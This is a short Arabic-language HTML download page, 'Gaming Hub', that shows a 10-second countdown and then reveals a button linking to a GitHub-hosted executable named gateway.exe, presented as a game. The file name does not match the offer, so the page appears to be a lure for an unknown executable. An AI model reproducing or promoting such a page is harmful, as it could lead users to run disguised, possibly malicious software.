<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gaming Hub</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: #f4f4f9; 
            color: #333; 
            text-align: center; 
            padding: 50px; 
        }
        .container { 
            background: white; 
            padding: 40px; 
            border-radius: 15px; 
            display: inline-block; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
            max-width: 500px;
        }
        h1 { color: #2c3e50; }
        #timer { font-size: 40px; font-weight: bold; color: #3498db; margin: 20px 0; }
        .download-btn { 
            background-color: #27ae60; 
            color: white; 
            padding: 15px 30px; 
            text-decoration: none; 
            border-radius: 8px; 
            font-weight: bold; 
            display: none; 
            font-size: 20px;
            transition: background 0.3s;
        }
        .download-btn:hover { background-color: #219150; }
        p { font-size: 18px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>تحميل اللعبة</h1>
        <p>شكراً لاختيارك اللعبة، سيبدأ الرابط بالظهور خلال ثوانٍ قليلة:</p>
        <div id="timer">10</div>
        <a href="https://github.com/30066-G/nl.live/releases/download/v1.0/gateway.exe" id="btn" class="download-btn">بدء التحميل الآن</a>
        <p id="msg">يرجى الانتظار...</p>
    </div>

    <script>
        let count = 10;
        const timerElement = document.getElementById('timer');
        const btnElement = document.getElementById('btn');
        const msgElement = document.getElementById('msg');
        const countdown = setInterval(() => {
            count--;
            timerElement.innerText = count;
            if (count <= 0) {
                clearInterval(countdown);
                timerElement.style.display = "none";
                btnElement.style.display = "inline-block";
                msgElement.innerText = "الرابط جاهز للتحميل!";
            }
        }, 1000);
    </script>
</body>
</html>
